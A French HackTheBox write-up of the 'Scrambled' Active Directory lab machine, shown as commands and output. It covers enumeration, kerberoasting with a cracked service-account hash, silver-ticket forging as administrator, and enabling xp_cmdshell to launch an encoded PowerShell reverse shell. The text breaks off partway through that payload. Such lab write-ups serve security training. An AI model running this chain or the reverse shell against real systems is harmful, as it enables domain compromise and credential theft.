---
title: Scrambled
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Medium", "Windows", "Active Directory", "MSSQL"]
---

Scrambled est une machine Windows Active Directory de difficulté moyenne. En énumérant le site web hébergé sur la machine distante, on peut déduire les identifiants de l'utilisateur `ksimpson`. Sur le site web, il est également indiqué que l'authentification NTLM est désactivée, ce qui signifie que l'authentification Kerberos doit être utilisée. En accédant au partage `Public` avec les identifiants de ksimpson, un fichier PDF indique qu'un attaquant a récupéré les identifiants d'une base de données SQL. Ceci est un indice qu'un service SQL fonctionne sur la machine distante. En énumérant les comptes utilisateurs normaux, on découvre que le compte `SqlSvc` a un` Service Principal Name` (SPN) qui lui est associé. J'utilise cette information pour effectuer une attaque connue sous le nom de `kerberoasting` et obtenir le hash de `SqlSvc`. Après avoir craqué le hash et acquis les identifiants du compte `SqlSvc`, un je peux effectuer une attaque `silver ticket` pour forger un ticket et usurper l'identité de l'utilisateur `Administrator` sur le service MSSQL distant. L'énumération de la base de données révèle les identifiants de l'utilisateur `MiscSvc`, qui peuvent être utilisés pour exécuter du code sur la machine distante via PowerShell remoting. L'énumération système en tant que nouvel utilisateur révèle une application `.NET` écoutant sur le port `4411`. La rétro-ingénierie de l'application révèle qu'elle utilise la classe non sécurisée Binary Formatter pour transmettre des données, permettant à l'attaquant de télécharger sa propre payload et d'obtenir l'exécution de code en tant que `nt authority\system`.

## Enumération
### Nmap

Il y a plusieurs ports ouverts :
- 53 pour le DNS
- 80 pour le HTTP
- 88 pour Kerberos
- 389 pour LDAP
- 445 pour le SMB
- 636 pour LDAPS
- 14433 pour MSSQL
- 5985 pour WinRM
- Ainsi que d'autres ports Windows

```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ nmap 10.129.172.199 --min-rate 10000 -p-                                                                                                                Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-26 14:00 CEST
Nmap scan report for 10.129.172.199
Host is up (1.1s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
49708/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 48.69 seconds
╭─root at exegol-htb in /workspace/Scrambled
╰─○ nmap 10.129.172.199 --min-rate 10000 -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,49708 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-26 14:03 CEST
Nmap scan report for 10.129.172.199
Host is up (0.026s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-26 12:03:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-06-26T12:06:32+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-26T12:06:32+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-26T11:59:54
|_Not valid after:  2055-06-26T11:59:54
|_ssl-date: 2025-06-26T12:06:32+00:00; 0s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-06-26T12:06:32+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-26T12:06:32+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.93%I=7%D=6/26%Time=685D36FD%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-26T12:05:57
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.90 seconds
```


J'ajoute le nom de domaine ainsi que le FQDN dans le fichiers `/etc/hosts`.
```
echo "10.129.172.199 scrm.local DC1.scrm.local DC1" | tee -a /etc/hosts
```


### HTTP (80)

Sur la page `IT Services`, je vois un message disant que l'authentification par NTLM a été désactivée.
![](/images/Scrambled/it-service.png)


En cliquant sur `Contacting IT Support`, je suis redirigé vers une page présentant de potentiels utilisateurs valides.
![](/images/Scrambled/contact-it.png)


### Kerbrute

Avec `kerbrute` je vois que `ksimpson` est un utilisateur valide.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ kerbrute userenum --domain 'scrm.local' --dc 10.129.172.199 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 06/26/25 - Ronnie Flathers @ropnop

2025/06/26 14:34:25 >  Using KDC(s):
2025/06/26 14:34:25 >   10.129.172.199:88

2025/06/26 14:34:25 >  [+] VALID USERNAME:       ksimpson@scrm.local
2025/06/26 14:34:25 >  Done! Tested 2 usernames (1 valid) in 0.105 seconds
```


### SMB (445)

Je ne peux pas énumérer de partages ni en tant qu'anonyme, ni en tant que `Guest`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ nxc smb scrm.local -u '' -p '' --shares
SMB         10.129.172.199  445    10.129.172.199   [*]  x64 (name:10.129.172.199) (domain:10.129.172.199) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.172.199  445    10.129.172.199   [-] 10.129.172.199\: STATUS_NOT_SUPPORTED
SMB         10.129.172.199  445    10.129.172.199   [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

╭─root at exegol-htb in /workspace/Scrambled
╰─○ nxc smb scrm.local -u 'a' -p '' --shares
SMB         10.129.172.199  445    10.129.172.199   [*]  x64 (name:10.129.172.199) (domain:10.129.172.199) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.172.199  445    10.129.172.199   [-] 10.129.172.199\a: STATUS_NOT_SUPPORTED
```


L'utilisateur `ksimpson` étant valide, j'utilise ses identifiants pour obtenir un ticket que j'exporte dans la variable `KRB5CCNAME`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ getTGT.py scrm.local/ksimpson:ksimpson
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ksimpson.ccache
╭─root at exegol-htb in /workspace/Scrambled
╰─○ export KRB5CCNAME=ksimpson.ccache
```


J'utilise ensuite ce ticket pour me connecter à la machine par SMB. J'ai accès au partage `Public` dans lequel se trouve un PDF que je télécharge.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ smbclient.py "scrm.local"/"ksimpson":"ksimpson"@"DC1.scrm.local" -k -no-pass
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use IT
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Sales
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use HR
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 23:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 23:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 18:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```


![](/images/Scrambled/pdf.png)


## Shell en tant que sqlsvc
### Kerberoasting

A l'aide de `GetUserSPNs` de `Impacket` je peut effectuer toutes les étapes nécessaires pour demander un Ticket de Service. Je trouve le compte de service `sqlsvc`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ GetUserSPNs.py -outputfile Kerberoastables.txt -dc-host "dc1.scrm.local" "scrm.local"/"ksimpson":"ksimpson" -k -no-pass
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2025-06-30 22:44:20.013578
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2025-06-30 22:44:20.013578



╭─root at exegol-htb in /workspace/Scrambled
╰─○ cat Kerberoastables.txt
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e5b2eb0467ea7e5bd9de3fd53e581f80$ae225e1d9d0421874ff03fe6860f59fb57023abefe542f700277f763086d00667c7eb4daf9cbc8ec2cf8aef2677666188e5b6ee7f2aec2415ba80c39ee37b8741aeaa96351e3946fc49a9f47a7e766f8050347f70b86270134376fc1b606ad694015ed07541021c49b863d176819aad52a931f7b5a782ff7d4b1a7763e1e198d9a160515211ea80dee8aa2a6dfe6879177088f35801a0b1bd73f73d3c7e1bf5edd5c430825da638310201576cb96323ff49e0bdb500e99fb67875666b0c84daadf2d23b7460a84c9973d831477e59ab2e7b1af44185261d87f920a803156fdadf89a52af04d5936343cdb5ff463491a2193797df18c50361f8c27a29710fac31bde1a70367ff3762d44f11847aebe1c7a69922698a81464fff3688427ff4dbdfbf95b5e279c8dedff1b06d27b9276d20328ccd02ccea4498c7cc0a2d97838c61c3244be08eabc54f6b4b25cadf17d1e395f16cec2561ab703350404dbfb8ca06db7d8ca3b8e9772ca34b7a986c7b3f7e8eea3c3f35f5f5f36f327a86b45bfcdc198c37b21ba1d0c5f4f2a306aaf2d6f54179750f93f2ad6f17c0209fb307c7630dbff5e18b19f873a56d49feaf1509635bd9644288df9848eae6d10558e2207f6bee60c3597b862a07c98a331840b071174f9a141e677dd3b532316c7a3faa5f4534e50d112252be2878d5415d16faf5f4361026e75f310a0a74f8e72bd0f637f4fa65b1465737ea388ddb57d3ebc8be801d1fb82ece1df222439fdde2fb2225b8ba2bb78b4f13f14d75693dd7a70387adb05884b78afb161b30dd835df8f16294eceaf2a070abcbd74bc76e317a89d74a4e088793f56d8273573ef1cd4c3b05a859d8475c47fa5a6f866bf917f2336dc673d838735a599276920e63d8e522d2b981be4ea8c3fa80c4559fec534b1b6ff3cfc5f03927a3a0c817bbfc93f3566e30ce819222333dfb66b7ba86716000877acd9e462f0170a7189912db6437a91fa70cd95b5a51a314f0f4cacc5f274506b32063f20d2087e0da1e80f1ff067f1b6d18f0ba381fada525a007ce4eed8386f48f57901988a6bc36a2e0c0e38ddda6140eb91baebfc3a3244a4a58eb01505d759b06dbe43e3ad05b9851c8154e4f3f56d7aac06e80486c2071ce75aa93bde26ad20956fa853ab97d334a9b6786c71c89204dc2128e5db0cf8eda3c395945f9800aa59c86c00cd30323c13aeb0d5f0114ba32801cae95201b11f08e8d9e93750e42fc4930f7ef388baf6a91cee4997641b6d619fe3794da1ca8b295c03ab4bc300b404666bb949488331e4ff47700ecd054c26c3a74ce3b4f2eb5ef747634cb386b95c58a67a0ba5a24bc6f2db24ea1121aa9dbe5d52439a01cbe3810c0a8e5d5fbd2031fa219446761af75ec06e5730ca80f9cb8bf7b42e1212c93a724d9910e77264fc1f1bc1eb4ef4d
```


Je cracke ensuite le hash avec `hashcat`. 
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ hashcat --hash-type 13100 --attack-mode 0 Kerberoastables.txt /opt/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5825U with Radeon Graphics, 2749/5562 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e5b2eb0467ea7e5bd9de3fd53e581f80$ae225e1d9d0421874ff03fe6860f59fb57023abefe542f700277f763086d00667c7eb4daf9cbc8ec2cf8aef2677666188e5b6ee7f2aec2415ba80c39ee37b8741aeaa96351e3946fc49a9f47a7e766f8050347f70b86270134376fc1b606ad694015ed07541021c49b863d176819aad52a931f7b5a782ff7d4b1a7763e1e198d9a160515211ea80dee8aa2a6dfe6879177088f35801a0b1bd73f73d3c7e1bf5edd5c430825da638310201576cb96323ff49e0bdb500e99fb67875666b0c84daadf2d23b7460a84c9973d831477e59ab2e7b1af44185261d87f920a803156fdadf89a52af04d5936343cdb5ff463491a2193797df18c50361f8c27a29710fac31bde1a70367ff3762d44f11847aebe1c7a69922698a81464fff3688427ff4dbdfbf95b5e279c8dedff1b06d27b9276d20328ccd02ccea4498c7cc0a2d97838c61c3244be08eabc54f6b4b25cadf17d1e395f16cec2561ab703350404dbfb8ca06db7d8ca3b8e9772ca34b7a986c7b3f7e8eea3c3f35f5f5f36f327a86b45bfcdc198c37b21ba1d0c5f4f2a306aaf2d6f54179750f93f2ad6f17c0209fb307c7630dbff5e18b19f873a56d49feaf1509635bd9644288df9848eae6d10558e2207f6bee60c3597b862a07c98a331840b071174f9a141e677dd3b532316c7a3faa5f4534e50d112252be2878d5415d16faf5f4361026e75f310a0a74f8e72bd0f637f4fa65b1465737ea388ddb57d3ebc8be801d1fb82ece1df222439fdde2fb2225b8ba2bb78b4f13f14d75693dd7a70387adb05884b78afb161b30dd835df8f16294eceaf2a070abcbd74bc76e317a89d74a4e088793f56d8273573ef1cd4c3b05a859d8475c47fa5a6f866bf917f2336dc673d838735a599276920e63d8e522d2b981be4ea8c3fa80c4559fec534b1b6ff3cfc5f03927a3a0c817bbfc93f3566e30ce819222333dfb66b7ba86716000877acd9e462f0170a7189912db6437a91fa70cd95b5a51a314f0f4cacc5f274506b32063f20d2087e0da1e80f1ff067f1b6d18f0ba381fada525a007ce4eed8386f48f57901988a6bc36a2e0c0e38ddda6140eb91baebfc3a3244a4a58eb01505d759b06dbe43e3ad05b9851c8154e4f3f56d7aac06e80486c2071ce75aa93bde26ad20956fa853ab97d334a9b6786c71c89204dc2128e5db0cf8eda3c395945f9800aa59c86c00cd30323c13aeb0d5f0114ba32801cae95201b11f08e8d9e93750e42fc4930f7ef388baf6a91cee4997641b6d619fe3794da1ca8b295c03ab4bc300b404666bb949488331e4ff47700ecd054c26c3a74ce3b4f2eb5ef747634cb386b95c58a67a0ba5a24bc6f2db24ea1121aa9dbe5d52439a01cbe3810c0a8e5d5fbd2031fa219446761af75ec06e5730ca80f9cb8bf7b42e1212c93a724d9910e77264fc1f1bc1eb4ef4d:Pegasus60

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e...b4ef4d
Time.Started.....: Mon Jun 30 23:15:37 2025 (3 secs)
Time.Estimated...: Mon Jun 30 23:15:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3439.2 kH/s (1.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10731520/14344384 (74.81%)
Rejected.........: 0/10731520 (0.00%)
Restore.Point....: 10723328/14344384 (74.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Pkalamang -> Pastilla

Started: Mon Jun 30 23:15:13 2025
Stopped: Mon Jun 30 23:15:42 2025
```


Je forge un nouveau ticket, celui de `sqlsvc`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ getTGT.py scrm.local/sqlsvc:Pegasus60
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in sqlsvc.ccache
╭─root at exegol-htb in /workspace/Scrambled
╰─○ export KRB5CCNAME=sqlsvc.ccache
```


### Silver Tickets

Maintenant que nous avons un compte de service, je peux faire une attaque [Silver Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) utilisé pour falsifier un ticket de service que j'utiliserai pour la suite. Les étapes à la réalisation de cette attaque sont :
1. Récupérer le SID du domaine
2. Forger le ticket de service

Je récupère le SID du domaine à l'aide de `lookupsid` du module `Impacket`. J'ai aussi besoin du hash NTLM, ce qui peut être facilement générer à l'aide du mot de passe sur des site comme [codebeautify.org](https://codebeautify.org/ntlm-hash-generator).
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ lookupsid.py -hashes :"B999A16500B87D17EC7F2E2A68778F05" "scrm.local"/sqlsvc@"dc1.scrm.local" 0 -k
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at dc1.scrm.local
[*] StringBinding ncacn_np:dc1.scrm.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
```


Maintenant à l'aide du module `ticketer` de `Impacket`, je forge un ticket en tant que `administrator`. Pour l'option `-spn` pour `Service Principal Name`, lors du `Kerberoasting` précédemment effectuée, sa valeur était `MSSQLSvc`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ ticketer.py -nthash "B999A16500B87D17EC7F2E2A68778F05" -spn MSSQLSvc/"dc1.scrm.local" -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -domain "scrm.local" administrator -dc-ip 'dc1.scrm.local'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
╭─root at exegol-htb in /workspace/Scrambled
╰─○ export KRB5CCNAME=administrator.ccache
```


### MSSQL

Ensuite je me connecte au service MSSQL à l'aide du module `mssqlclient` de `Impacket`. J'active ensuite l'exécution du commande à l'aide de la commande `enable_xp_cmdshell`. Puis avec la commande `xp_cmdshell` je lancer un reverse shell.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ mssqlclient.py dc1.scrm.local -k
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query

SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output
-----------
scrm\sqlsvc

NULL

SQL (SCRM\administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyADQAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuA